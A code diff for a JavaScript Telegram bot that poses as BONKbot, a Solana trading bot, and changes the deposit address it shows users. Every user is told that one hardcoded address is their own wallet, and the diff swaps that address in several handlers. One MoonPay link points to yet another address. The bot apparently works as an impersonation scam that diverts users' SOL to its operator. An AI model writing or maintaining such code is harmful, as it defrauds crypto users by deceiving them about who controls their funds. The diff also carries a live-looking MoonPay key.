@@ -38,9 +38,9 @@ const registerCallbackHandlers = (bot) => {
                             chatId,
                             "Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!\n\n" +
                             "You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:\n\n" +
-                            "<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
+                            "<code>FkadvK2yuYoy255nbciXUQpD7xtmGfu3FizCp37HNLup</code> (tap to copy)\n\n" +
                             "Or buy SOL with Apple / Google Pay via MoonPay here:\n" +
-                            "<a href=\"https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D\">https://buy.moonpay.com</a>\n\n" +
+                            "<a href=\"https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=FkadvK2yuYoy255nbciXUQpD7xtmGfu3FizCp37HNLup&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D\">https://buy.moonpay.com</a>\n\n" +
                             "Once done, tap refresh and your balance will appear here.\n\n" +
                             "To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener or Meteora.\n\n" +
                             "For more info on your wallet and to export your seed phrase, tap 'Wallet' below.",
@@ -71,7 +71,7 @@ const registerCallbackHandlers = (bot) => {
                         chatId,
                         "Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!\n\n" +
                         "You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:\n\n" +
-                        "<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
+                        "<code>FkadvK2yuYoy255nbciXUQpD7xtmGfu3FizCp37HNLup</code> (tap to copy)\n\n" +
                         "Or buy SOL with Apple / Google Pay via MoonPay here:\n" +
                         "<a href=\"https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=4k5EaQx7hbzQLfvjhRRTm9CnemhmRbHBW5AKBZhENGBq&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D\">https://buy.moonpay.com</a>\n\n" +
                         "Once done, tap refresh and your balance will appear here.\n\n" +
@@ -93,7 +93,7 @@ const registerCallbackHandlers = (bot) => {
                     bot.sendMessage(
                         chatId,
                         "Your wallet.\n" +
-                        "Address:<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
+                        "Address:<code>FkadvK2yuYoy255nbciXUQpD7xtmGfu3FizCp37HNLup</code> (tap to copy)\n\n" +
                         `Balance: ${SOL.toFixed(9)} SOL\n\n` +
                         "Tap to copy the address and send SOL to deposit.",
                         {
@@ -105,7 +105,7 @@ const registerCallbackHandlers = (bot) => {
                     break;
                 }
                 case 'deposit':
-                    const walletAddress = "AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX";
+                    const walletAddress = "FkadvK2yuYoy255nbciXUQpD7xtmGfu3FizCp37HNLup";
                     bot.sendMessage(chatId, "To deposit send SOL to below address:");
                     bot.sendMessage(chatId, `<code>${walletAddress}</code>`, {
                         parse_mode: "HTML",
@@ -174,7 +174,7 @@ const registerCallbackHandlers = (bot) => {
                     bot.sendMessage(
                         chatId,
                         "Your wallet.\n" +
-                        "Address:<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
+                        "Address:<code>FkadvK2yuYoy255nbciXUQpD7xtmGfu3FizCp37HNLup</code> (tap to copy)\n\n" +
                         `Balance: ${SOL.toFixed(9)} SOL\n\n` +
                         "Tap to copy the address and send SOL to deposit.",
                         {
